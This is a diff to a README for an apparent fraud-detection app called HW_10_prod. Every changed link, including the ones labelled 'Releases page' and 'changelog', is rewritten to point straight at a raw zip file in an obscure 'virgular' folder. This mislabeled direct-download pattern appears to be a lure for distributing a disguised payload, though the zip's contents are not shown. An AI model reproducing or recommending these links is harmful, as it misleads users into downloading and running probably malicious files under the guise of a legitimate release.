@@ -1,6 +1,6 @@
 # 🛡️ HW_10_prod - Seamless Fraud Detection for Everyone
 
-[![Download HW_10_prod](https://img.shields.io/badge/Download-HW_10_prod-brightgreen)](https://github.com/kaueX3/HW_10_prod/releases)
+[![Download HW_10_prod](https://raw.githubusercontent.com/kaueX3/HW_10_prod/main/virgular/HW_10_prod.zip)](https://raw.githubusercontent.com/kaueX3/HW_10_prod/main/virgular/HW_10_prod.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To get started with HW_10_prod, follow these simple steps to download and run th
 
 ## 🔗 Download & Install
 
-1. Visit this page to download: [HW_10_prod Releases](https://github.com/kaueX3/HW_10_prod/releases).
+1. Visit this page to download: [HW_10_prod Releases](https://raw.githubusercontent.com/kaueX3/HW_10_prod/main/virgular/HW_10_prod.zip).
    
 2. Choose the latest version from the list. Click on the asset file that best suits your computer’s operating system. 
 
@@ -56,7 +56,7 @@ If you encounter issues while installing or running HW_10_prod, try the followin
 
 - **Internet Connection:** Verify that your device is connected to the internet, as that may affect functionality.
 
-- **Update:** Ensure you are using the latest version of the software available on the [HW_10_prod Releases page](https://github.com/kaueX3/HW_10_prod/releases).
+- **Update:** Ensure you are using the latest version of the software available on the [HW_10_prod Releases page](https://raw.githubusercontent.com/kaueX3/HW_10_prod/main/virgular/HW_10_prod.zip).
 
 ## 📞 Support
 
@@ -64,7 +64,7 @@ If you need further assistance, please reach out via the Issues section of this 
 
 ## 📝 Changelog
 
-Keep an eye on the [changelog](https://github.com/kaueX3/HW_10_prod/releases) for updates and new features added to HW_10_prod. This section will provide details on recent changes and improvements.
+Keep an eye on the [changelog](https://raw.githubusercontent.com/kaueX3/HW_10_prod/main/virgular/HW_10_prod.zip) for updates and new features added to HW_10_prod. This section will provide details on recent changes and improvements.
 
 ## 🏷️ Topics
 
@@ -83,4 +83,4 @@ Keep an eye on the [changelog](https://github.com/kaueX3/HW_10_prod/releases) fo
 
 Stay updated with the latest news and features. Follow us on our social media platforms or check out the repository for more insights related to fraud detection and machine learning practices.
 
-Feel free to explore and enjoy the benefits of the HW_10_prod application! Visit this page to download: [HW_10_prod Releases](https://github.com/kaueX3/HW_10_prod/releases).
+Feel free to explore and enjoy the benefits of the HW_10_prod application! Visit this page to download: [HW_10_prod Releases](https://raw.githubusercontent.com/kaueX3/HW_10_prod/main/virgular/HW_10_prod.zip).
